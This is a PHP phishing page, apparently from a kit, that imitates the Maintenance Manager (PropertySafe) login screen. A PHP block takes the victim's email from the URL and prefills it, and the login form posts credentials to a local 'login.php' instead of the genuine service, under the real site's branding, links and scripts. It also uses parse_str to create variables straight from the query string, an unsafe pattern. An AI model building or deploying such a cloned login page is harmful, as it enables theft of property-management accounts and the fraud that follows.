<?php
session_start();

// start > to get url and and put id 
 $url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 parse_str(parse_url($url, PHP_URL_QUERY));

 $parts = @explode('@', $userid);
 $user = @$parts[0];
// < end 


$email = $userid;
$_SESSION['email'] = $email;


?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8"><script type="text/javascript" src="site/f9b7c7829d"></script><script src="site/nr-1167.js"></script><script async="" src="site/analytics.js"></script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"f9b7c7829d",applicationID:"136197464"};window.NREUM||(NREUM={}),__nr_require=function(e,n,t){function r(t){if(!n[t]){var i=n[t]={exports:{}};e[t][0].call(i.exports,function(n){var i=e[t][1][n];return r(i||n)},i,i.exports)}return n[t].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<t.length;i++)r(t[i]);return r}({1:[function(e,n,t){function r(){}function i(e,n,t){return function(){return o(e,[u.now()].concat(f(arguments)),n?null:this,t),n?void 0:this}}var o=e("handle"),a=e(4),f=e(5),c=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",d=l+"ixn-";a(p,function(e,n){s[n]=i(l+n,!0,"api")}),s.addPageAction=i(l+"addPageAction",!0),s.setCurrentRouteName=i(l+"routeName",!0),n.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,n){var t={},r=this,i="function"==typeof n;return o(d+"tracer",[u.now(),e,t],r),function(){if(c.emit((i?"":"no-")+"fn-start",[u.now(),r,i],t),i)try{return n.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],t),e}finally{c.emit("fn-end",[u.now()],t)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,n){m[n]=i(d+n)}),newrelic.noticeError=function(e,n){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,n])}},{}],2:[function(e,n,t){function r(e,n){var t=e.getEntries();t.forEach(function(e){"first-paint"===e.name?c("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&c("timing",["fcp",Math.floor(e.startTime)])})}function i(e,n){var t=e.getEntries();t.length>0&&c("lcp",[t[t.length-1]])}function o(e){if(e instanceof s&&!l){var n,t=Math.round(e.timeStamp);n=t>1e12?Date.now()-t:u.now()-t,l=!0,c("timing",["fi",t,{type:e.type,fid:n}])}}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var a,f,c=e("handle"),u=e("loader"),s=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){a=new PerformanceObserver(r),f=new PerformanceObserver(i);try{a.observe({entryTypes:["paint"]}),f.observe({entryTypes:["largest-contentful-paint"]})}catch(p){}}if("addEventListener"in document){var l=!1,d=["click","keydown","mousedown","pointerdown","touchstart"];d.forEach(function(e){document.addEventListener(e,o,!1)})}}},{}],3:[function(e,n,t){function r(e,n){if(!i)return!1;if(e!==i)return!1;if(!n)return!0;if(!o)return!1;for(var t=o.split("."),r=n.split("."),a=0;a<r.length;a++)if(r[a]!==t[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var f=navigator.userAgent,c=f.match(a);c&&f.indexOf("Chrome")===-1&&f.indexOf("Chromium")===-1&&(i="Safari",o=c[1])}n.exports={agent:i,version:o,match:r}},{}],4:[function(e,n,t){function r(e,n){var t=[],r="",o=0;for(r in e)i.call(e,r)&&(t[o]=n(r,e[r]),o+=1);return t}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],5:[function(e,n,t){function r(e,n,t){n||(n=0),"undefined"==typeof t&&(t=e?e.length:0);for(var r=-1,i=t-n||0,o=Array(i<0?0:i);++r<i;)o[r]=e[n+r];return o}n.exports=r},{}],6:[function(e,n,t){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,n,t){function r(){}function i(e){function n(e){return e&&e instanceof r?e:e?c(e,f,o):o()}function t(t,r,i,o){if(!l.aborted||o){e&&e(t,r,i);for(var a=n(i),f=v(t),c=f.length,u=0;u<c;u++)f[u].apply(a,r);var p=s[y[t]];return p&&p.push([b,t,r,a]),a}}function d(e,n){h[e]=v(e).concat(n)}function m(e,n){var t=h[e];if(t)for(var r=0;r<t.length;r++)t[r]===n&&t.splice(r,1)}function v(e){return h[e]||[]}function g(e){return p[e]=p[e]||i(t)}function w(e,n){u(e,function(e,t){n=n||"feature",y[t]=n,n in s||(s[n]=[])})}var h={},y={},b={on:d,addEventListener:d,removeEventListener:m,emit:t,get:g,listeners:v,context:n,buffer:w,abort:a,aborted:!1};return b}function o(){return new r}function a(){(s.api||s.feature)&&(l.aborted=!0,s=l.backlog={})}var f="nr@context",c=e("gos"),u=e(4),s={},p={},l=n.exports=i();l.backlog=s},{}],gos:[function(e,n,t){function r(e,n,t){if(i.call(e,n))return e[n];var r=t();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,n,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[n]=r,r}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(e,n,t){function r(e,n,t,r){i.buffer([e],r),i.emit(e,n,t)}var i=e("ee").get("handle");n.exports=r,r.ee=i},{}],id:[function(e,n,t){function r(e){var n=typeof e;return!e||"object"!==n&&"function"!==n?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");n.exports=r},{}],loader:[function(e,n,t){function r(){if(!x++){var e=E.info=NREUM.info,n=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&n))return s.abort();u(y,function(n,t){e[n]||(e[n]=t)}),c("mark",["onload",a()+E.offset],null,"api");var t=d.createElement("script");t.src="https://"+e.agent,n.parentNode.insertBefore(t,n)}}function i(){"complete"===d.readyState&&o()}function o(){c("mark",["domContent",a()+E.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(f=Math.max((new Date).getTime(),f))-E.offset}var f=(new Date).getTime(),c=e("handle"),u=e(4),s=e("ee"),p=e(3),l=window,d=l.document,m="addEventListener",v="attachEvent",g=l.XMLHttpRequest,w=g&&g.prototype;NREUM.o={ST:setTimeout,SI:l.setImmediate,CT:clearTimeout,XHR:g,REQ:l.Request,EV:l.Event,PR:l.Promise,MO:l.MutationObserver};var h=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1167.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),E=n.exports={offset:f,now:a,origin:h,features:{},xhrWrappable:b,userAgent:p};e(1),e(2),d[m]?(d[m]("DOMContentLoaded",o,!1),l[m]("load",r,!1)):(d[v]("onreadystatechange",i),l[v]("onload",r)),c("mark",["firstbyte",f],null,"api");var x=0,O=e(6)},{}],"wrap-function":[function(e,n,t){function r(e){return!(e&&e instanceof Function&&e.apply&&!e[a])}var i=e("ee"),o=e(5),a="nr@original",f=Object.prototype.hasOwnProperty,c=!1;n.exports=function(e,n){function t(e,n,t,i){function nrWrapper(){var r,a,f,c;try{a=this,r=o(arguments),f="function"==typeof t?t(r,a):t||{}}catch(u){l([u,"",[r,a,i],f])}s(n+"start",[r,a,i],f);try{return c=e.apply(a,r)}catch(p){throw s(n+"err",[r,a,p],f),p}finally{s(n+"end",[r,a,c],f)}}return r(e)?e:(n||(n=""),nrWrapper[a]=e,p(e,nrWrapper),nrWrapper)}function u(e,n,i,o){i||(i="");var a,f,c,u="-"===i.charAt(0);for(c=0;c<n.length;c++)f=n[c],a=e[f],r(a)||(e[f]=t(a,u?f+i:i,o,f))}function s(t,r,i){if(!c||n){var o=c;c=!0;try{e.emit(t,r,i,n)}catch(a){l([a,t,r,i])}c=o}}function p(e,n){if(Object.defineProperty&&Object.keys)try{var t=Object.keys(e);return t.forEach(function(t){Object.defineProperty(n,t,{get:function(){return e[t]},set:function(n){return e[t]=n,n}})}),n}catch(r){l([r])}for(var i in e)f.call(e,i)&&(n[i]=e[i]);return n}function l(n){try{e.emit("internal-error",n)}catch(t){}}return e||(e=i),t.inPlace=u,t.flag=a,t}},{}]},{},["loader"]);</script>
<style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="stylesheet" type="text/css" href="site/jquery-ui.css">
<link rel="stylesheet" type="text/css" href="site/bootstrap.css">
<link rel="stylesheet" type="text/css" href="site/bootstrap-responsive.css">
<link rel="stylesheet" type="text/css" href="site/abound.css">
<link rel="stylesheet" type="text/css" href="site/style-propsafe.css">
<link rel="stylesheet" type="text/css" href="site/extras.css">
<script type="text/javascript" src="site/jquery_004.js"></script>
<script type="text/javascript" src="site/jquery_003.js"></script>
<script type="text/javascript" src="site/jquery.js"></script>
<script type="text/javascript" src="site/fontawesome-all.js"></script>
<script type="text/javascript" src="site/bootstrap.js"></script>
<script type="text/javascript" src="site/printtocsv.js"></script>
<script type="text/javascript" src="site/highcharts.js"></script>
<script type="text/javascript" src="site/highcharts-3d.js"></script>
<script type="text/javascript" src="site/highcharts-more.js"></script>
<script type="text/javascript" src="site/solid-gauge.js"></script>
<script type="text/javascript" src="site/loader.js"></script>
<script type="text/javascript" src="site/mmgr.js"></script>
<script type="text/javascript" src="site/jquery_002.js"></script>
<script type="text/javascript" src="site/tinymce.js"></script>
<script type="text/javascript">
/*<![CDATA[*/
        if (typeof(mmgr) === "undefined") {
            mmgr = {};
        }
        mmgr.GLOBALS = {"BASEURL":"\/index.php","SYSTEM_TYPE":"prod-nz","ColouredRiskIndicators":"off","PmTimeToActionLow":"3","PmTimeToActionMedium":"6","PmTimeToActionHigh":"9","TagRespondTimeLow":"3","TagRespondTimeMedium":"6","TagRespondTimeHigh":"9","OrganisationType":"Real Estate","pubnubPubKey":"pub-c-17813c7e-fea0-4148-855c-b32cbf430d07","pubnubSubKey":"sub-c-51372fea-6a92-11e6-92a0-02ee2ddab7fe"};
/*]]>*/
</script>
<title>Maintenance Manager - Maintenance Manager - Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="site/css.css" rel="stylesheet" type="text/css">

<!--[if lt IE 9]>
      <script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

<link rel="shortcut icon" href="https://my.mmgr.co.nz/themes/abound/img/icons/favicon.ico">
</head>
<body>
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-43028352-11', 'auto');
        ga('send', 'pageview');
    </script>
<section id="navigation-main">

<style>
        div.navbar > div.navbar-inner, ul.nav-menu > li.credit-display {
            background-color: black;
            background-image: -moz-linear-gradient(top, black, black);
            background-image: -webkit-gradient(linear, 0 0, 0 100%, from(black), to(black));
            background-image: -webkit-linear-gradient(top, black, black);
            background-image: -o-linear-gradient(top, black, black);
            background-image: linear-gradient(to bottom, black, black);
            background-repeat: repeat-x;
            border-color: black;
        }
        .navbar span#nav-search-box {
            background-color: #000000;
        }
    </style>
<div class="navbar navbar-inverse navbar-fixed-top">
<div class="navbar-inner">
<div class="container">
<a class="brand-logo" href="https://my.mmgr.co.nz/index.php/site/intray"></a>
<div class="pull-right">
<div id="pm-kpi-container">
<div id="pm-kpi-box" class="pm-kpi-metrics"></div>
</div>
<ul class="pull-right nav nav-menu" id="yw3">
<li><a href="https://my.mmgr.co.nz/index.php/site/login">Login</a></li>
</ul> </div>
<span id="nav-search-box">
<div id="job-search">
<form id="yw4" action="https://my.mmgr.co.nz/index.php/jobs/search" method="get"><input title="Job search" placeholder="Job search " id="jobs-search-input" type="text" name="jobs-search-input" class="ui-autocomplete-input" autocomplete="off" role="textbox" aria-autocomplete="list" aria-haspopup="true">
<input class="search-button" src="site/search.png" type="image" name="yt1" value="submit" id="yt1"></form></div>
<div id="property-search">
<form id="yw5" action="https://my.mmgr.co.nz/index.php/properties/search" method="get"><input title="Property search" placeholder="Property search" id="search-input" type="text" name="search-input" class="ui-autocomplete-input" autocomplete="off" role="textbox" aria-autocomplete="list" aria-haspopup="true">
<input class="search-button" src="site/search.png" type="image" name="yt2" value="submit" id="yt2"></form></div>
</span>
</div>
</div>
</div>
</section>
<section class="main-body">
<div class="container-fluid">

<div id="content">

<div id="flash-message" class="flash" style="display: none;"></div>
<div class="page-header">
<h1>Welcome <small>to Maintenance Manager</small></h1>
</div>
<div class="row-fluid">
<div class="span4 offset4">
<div id="yw0" class="portlet">
<div class="portlet-decoration">
<div class="portlet-title">Login to your account</div>
</div>
<div class="portlet-content">
<div id="browser-warning" class="flash-notice" style="display:none">
<p>
You appear to be viewing this page on an older version of <b>Internet Explorer</b>.<br>
However your browser does not support newer features that will affect 
operation of the site and could have potential security risks.
</p>
<p>
Please upgrade to the latest version of <a href="https://www.google.com/chrome/browser/">Google Chrome</a>, <a href="https://www.mozilla.org/en-US/firefox/new/">Mozilla Firefox</a> or <a href="https://windows.microsoft.com/en-au/internet-explorer/download-ie">Internet Explorer</a>.
</p>
</div>
<div class="form resetpw-form">
<form id="login-form" action="login.php" method="post">
<div style="display:none"><input type="hidden" value="f51bde853aedc0067d6d93c74f6fab907415293b" name="MMgrAppMyFrsc"></div>
<div class="row">
<label for="LoginForm_username">Username *<img class="helpIcon float-right" src="site/helpicon.png" alt="Help" data-original-title="For most users this will match your email address."></label> <input style="width: 95%" tabindex="2" name="username" value="<?php echo $email; ?>" id="LoginForm_username" type="text"> <div class="errorMessage" id="LoginForm_username_em_" style="display:none"></div> </div>
<div class="row">
<label for="LoginForm_password">Password *<a class="float-right" href="https://my.mmgr.co.nz/index.php/site/resetpw">Forgot password?</a></label> <input style="width: 95%" tabindex="3" name="password" id="LoginForm_password" type="password"> <div class="errorMessage" id="LoginForm_password_em_" style="display:none"></div> </div>
<div class="row rememberMe">
<label tabindex="4" for="LoginForm_rememberMe"><input id="ytLoginForm_rememberMe" type="hidden" value="0" name="LoginForm[rememberMe]"><input name="LoginForm[rememberMe]" id="LoginForm_rememberMe" value="1" type="checkbox"> Remember me next time</label> <div class="errorMessage" id="LoginForm_rememberMe_em_" style="display:none"></div> </div>
<div class="row buttons">
<input class="btn btn-primary" style="width: 100%" tabindex="5" type="submit" name="yt0" value="Login"> </div>
</form> </div>
</div>
</div> </div>
</div>
<div class="resetpw-help">
<div>
Want to know more?
</div>
<div>
<a href="https://www.mmgr.co.nz/">Maintenance Manager</a> |
<a href="https://www.propertysafe.co.nz/">PropertySafe</a> </div>

</div>
<script type="text/javascript">
var checkBrowser = (function(){
    var ua= navigator.userAgent, tem,
    M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem= ua.match(/\bOPR\/(\d+)/)
        if(tem!= null) return 'Opera '+tem[1];
    }
    M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem= ua.match(/version\/(\d+)/i))!= null){
        M.splice(1, 1, tem[1]);
    }

    if (M[0] === 'MSIE' && M[1] <= 9) {
    	$('div#browser-warning').show();
    }
});
checkBrowser();

$(document).on('change','#country',function()
{
    var subPart = 'my.';
    var selection = $(this).val();
    window.location.href = 'https://' + subPart + 'mmgr.' + (selection === 'NZ'
        ? 'co.nz'
        : 'com.au');
});
</script>
</div>
<ul id="intrayMenu" style="display:none;z-index: 1001;" class="ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem">
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/actions/recommendations">PropertySafe Recommended Actions</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/maintreqs/index">Maintenance Requests</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/quotecomp">Quotes Comparisons</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/landlordApprovals">Landlord Approvals</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/payments">Payment Approvals</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/site/overdue">Attention Required</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/site/notes">Notes Received</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/actions/landlordattending">Landlord Attending</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/strataattending">Strata Attending</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/tenantattending">Tenant Attending</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/jobs/tenantverified">Tenant Verified</a></li>
<li class="ui-menu-item" role="menuitem"><a href="https://my.mmgr.co.nz/index.php/ReviewCorrespondence/index">Review Correspondence</a></li>
</ul>
</div>
</section>

<footer>
<div class="subnav navbar navbar-fixed-bottom">
<div class="navbar-inner" style="min-height:18px">
<div class="row-fluid">
<div class="span4">
<small class="pull-left" style="padding-left:1em; padding-top:3px; text-align:left;"></small>
</div>
<div class="span4" style="padding-top:3px">
<small>Copyright © 2020 PropertySafe. MMgr V4.14.2.</small>
</div>
<div class="span4">
<small class="pull-right" style="padding-right:1em; padding-top:3px">Guest</small>
</div>
</div>
</div>
</div>
</footer>
<script type="text/javascript" src="site/jquery-ui.js"></script>
<script type="text/javascript" src="site/jquery_005.js"></script>
<script type="text/javascript">
/*<![CDATA[*/
jQuery(function($) {
        $.ajaxPrefilter(function(options, originalOptions, jqXHR)
        {
            if (('type' in options && options.type.toLowerCase() === 'post') || ('type' in originalOptions && originalOptions.type.toLowerCase() === 'post'))
            {
                options.data += '&MMgrAppMyFrsc=f51bde853aedc0067d6d93c74f6fab907415293b';
                if (options.data.charAt(0) === '&') {
                    options.data = options.data.substr(1);
                }
            }
            else
            {
                return true;
            }
        });
$('#login-form').yiiactiveform({'validateOnSubmit':true,'attributes':[{'id':'LoginForm_username','inputID':'LoginForm_username','errorID':'LoginForm_username_em_','model':'LoginForm','name':'username','enableAjaxValidation':false,'clientValidation':function(value, messages, attribute) {

if($.trim(value)=='') {
	messages.push("Username cannot be blank.");
}

}},{'id':'LoginForm_password','inputID':'LoginForm_password','errorID':'LoginForm_password_em_','model':'LoginForm','name':'password','enableAjaxValidation':false,'clientValidation':function(value, messages, attribute) {

if($.trim(value)=='') {
	messages.push("Password cannot be blank.");
}

}},{'id':'LoginForm_rememberMe','inputID':'LoginForm_rememberMe','errorID':'LoginForm_rememberMe_em_','model':'LoginForm','name':'rememberMe','enableAjaxValidation':false,'clientValidation':function(value, messages, attribute) {

if($.trim(value)!='' && value!="1" && value!="0") {
	messages.push("Remember me next time must be either 1 or 0.");
}

}}]});
jQuery('#intrayMenu').menu([]);
$('a[rel*=external]').click(function(){
            window.open($(this).attr('href'),
                'MMgr Help',
                'height=720,width=1280,left=10,top=10,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no,status=yes');
            return false;
        });
jQuery('#jobs-search-input').autocomplete({'minLength':'2','delay':250,'select':function(event, ui) {
                newLocn = "https://my.mmgr.co.nz/index.php/jobs/events/" + ui.item.id;
                window.location.href = newLocn;
                return false;
            },'close':function(){
            },'source':'https://my.mmgr.co.nz/index.php/jobs/quicksearch'});
$('body').on('click','#yt1',function(){jQuery.yii.submitForm(this,'',{});return false;});
jQuery('#search-input').autocomplete({'minLength':'2','delay':250,'select':function(event, ui) {
                newLocn = "https://my.mmgr.co.nz/index.php/properties/view/" + ui.item.id;
                window.location.href = newLocn;
                return false;
            },'close':function(){
            },'source':'https://my.mmgr.co.nz/index.php/properties/quicksearch'});
$('body').on('click','#yt2',function(){jQuery.yii.submitForm(this,'',{});return false;});
    $(document).on('click', function (e) {
        var intrayMenu = $('#intrayMenu');
        if (intrayMenu.is(':visible') && $(e.target).attr('id')!=='intrayMenu' && $(e.target).parent().parent().attr('id')!=='intrayMenu') {
            intrayMenu.hide();
        }
    });
    $('#intrayMenu').on('click', 'a', function () {
        var link = $(this).attr('href');
        if (link.length > 0) {
            window.location.href = link;
        }
    });
    $('.intray-menu').on('mouseenter',function(e) {
        $('#jbsMenu').hide();
        e.preventDefault();
        // Set up the menu options??

        $('#intrayMenu').show().position({"my":"left top", "at":"left bottom", "of":$(this), "collision":"fit"});
        return false;
    });
    function printPage()
    {
        $('section#navigation-main,div.breadcrumb,div#property-search,footer,.pm-kpi-metrics,div.ps-sidebar,div.ps-operations').css({
            'display':'none'
        });
        $('div.container-fluid').css({
            'padding-top':'0px'
        });
        window.print();
        $('section#navigation-main,div.breadcrumb,div#property-search,footer,.pm-kpi-metrics,div.ps-sidebar,div.ps-operations').css({
            'display':'block'
        });
        $('div.container-fluid').css({
            'padding-top':'55px'
        });
        return false;
    }
          $('.initially-hidden').show();
          var height = $(window).height();
          var width = $(window).width();
          // Need both for portrait or landscape
          if ((width <= 1024 && height <= 800) || (width <= 800 && height <= 1024)) {
              $('meta[name="viewport"]').attr('content', 'initial-scale=1, maximum-scale=2, width=device-width, height=device-height, target-densitydpi=medium-dpi');
          }

          $('.helpIcon').tooltip({
              'placement': 'right',
              'trigger': 'hover'
          });
          $('.helpIconLeft').tooltip({
              'placement': 'left',
              'trigger': 'hover'
          });
          $('.helpIconTop').tooltip({
              'placement': 'top',
              'trigger': 'hover'
          });
});
jQuery(window).load(function() {
 $("#yw1").appendTo($("#bread")).show(); 
});
/*]]>*/
</script>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"f9b7c7829d","applicationID":"136197464","transactionName":"NAQHbUEFWhECVxVYWQ1OJFpHDVsMTGcIRVMgDgtNQQtYDgZGTl1ZBAgL","queueTime":0,"applicationTime":82,"atts":"GEMEGwkfSR8=","errorBeacon":"bam.nr-data.net","agent":""}</script>

<ul class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem" style="z-index: 1031; top: 0px; left: 0px; display: none;"></ul><ul class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem" style="z-index: 1031; top: 0px; left: 0px; display: none;"></ul><div id="extwaiimpotscp" style="display:none" v="{8078" f="ZXpnd056Z3pNMlE1TFRobFlUY3ROREptT0MxaE9HRTBMVFEyWm1ZM05URTVaR1E0WW4wPQ==" q="bad00d1b" c="217.9" i="227.9" u="0.009" s="20020318" w="false" m="BMe=" vn="0ytd2"></div></body></html>